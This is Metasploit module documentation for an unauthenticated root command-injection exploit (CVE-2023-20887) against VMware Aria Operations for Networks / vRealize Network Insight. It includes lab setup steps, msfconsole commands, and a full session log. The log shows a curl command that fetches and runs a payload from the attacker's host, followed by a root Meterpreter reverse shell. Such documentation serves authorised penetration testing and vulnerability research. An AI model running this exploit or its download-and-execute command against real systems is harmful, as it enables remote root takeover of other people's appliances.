## Vulnerable Application

VMWare Aria Operations for Networks (vRealize Network Insight) is vulnerable to command injection
when accepting user input through the Apache Thrift RPC interface. This vulnerability allows a
remote unauthenticated attacker to execute arbitrary commands on the underlying operating system
as the root user. The RPC interface is protected by a reverse proxy which can be bypassed.
VMware has evaluated the severity of this issue to be in the Critical severity range with a
maximum CVSSv3 base score of 9.8. A malicious actor can get remote code execution in the
context of `root` on the appliance.
VMWare versions 6.2 to 6.10 are vulnerable.

This module exploits the vulnerability to upload and execute payloads gaining root privileges.
Successfully tested against version 6.8.0.

### Install

The OVA file can be downloaded from the VMware Customer Connect portal.

1. Import the file VMware-vRealize-Network-Insight-6.8.0.1666364233-platform.ova into VMware Fusion
2. Login with the given credentials `consoleuser:console`
3. Run the `setup` command to begin setup

Starting Step 1/4: Create User Passwords
1. Enter and re-enter SSH_User_Password: `notpassword`
2. Enter and re-enter CLI_User_Password: `notpassword`

Starting Step 2/4: Network Configuration:
1. Enter IP_Family: `ipv4`
2. Enter IP_Address: `192.168.1.60`
3. Enter Default_Gateway: `192.168.1.254`
4. Enter DNS: `4.2.2.4 8.8.8.8`
5. Enter Domain_Search: `example.com`
6. Save configuration: `y`

Starting Step 3/3: Network Time Server Configuration:
1. Is the Network Time Security supported for NTP servers? `n`
2. Enter NTP servers: `0.us.pool.ntp.org`

Step 4/4: Web-Proxy (Optional Configuration)
1. Configure web proxy?: `n`


## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use linux/http/vmware_vrni_rce_cve_2023_20887`
1. Do: `set rhost [ip]`
1. Do: `set lhost [ip]`
1. Do: `set FETCH_SRVHOST [ip]`
1. Do: `run`
1. You should get a root shell.

## Options

## Scenarios

### VMware vRealize Network Insight 6.8.0 1666364233

```
msf6 > use linux/http/vmware_vrni_rce_cve_2023_20887
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/vmware_vrni_rce_cve_2023_20887) > set rhost 192.168.1.60
rhost => 192.168.1.60
msf6 exploit(linux/http/vmware_vrni_rce_cve_2023_20887) > set lhost 192.168.1.67
lhost => 192.168.1.67
msf6 exploit(linux/http/vmware_vrni_rce_cve_2023_20887) > set FETCH_SRVHOST 192.168.1.67
FETCH_SRVHOST => 192.168.1.67
msf6 exploit(linux/http/vmware_vrni_rce_cve_2023_20887) > options

Module options (exploit/linux/http/vmware_vrni_rce_cve_2023_20887):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.1.60     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    443              yes       The target port (TCP)
   SSL      true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      hHTNUdqFrV       no        Name to use on remote system when storing payload; cannot contain spaces.
   FETCH_SRVHOST       192.168.1.67     yes       Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR                   yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               192.168.1.67     yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix (In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/vmware_vrni_rce_cve_2023_20887) > rexploit
[*] Reloading module...

[*] Started reverse TCP handler on 192.168.1.67:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.1.60:443 can be exploited.
[+] The target is vulnerable. VMWare Aria Operations for Networks (vRealize Network Insight) version 6.8.0 was found.
[*] Executing Unix (In-Memory) with curl -so ./yjUczQeXbCf http://192.168.1.67:8080/VtUnMtEdkI5A0Lv6Y2zkFw; chmod +x ./yjUczQeXbCf; ./yjUczQeXbCf &
[*] Attempting to execute shell
[*] Sending stage (3045348 bytes) to 192.168.1.60
[*] Meterpreter session 9 opened (192.168.1.67:4444 -> 192.168.1.60:52370) at 2023-07-20 14:50:13 -0400

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.1.60
OS           : Ubuntu 18.04 (Linux 5.4.0-126-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
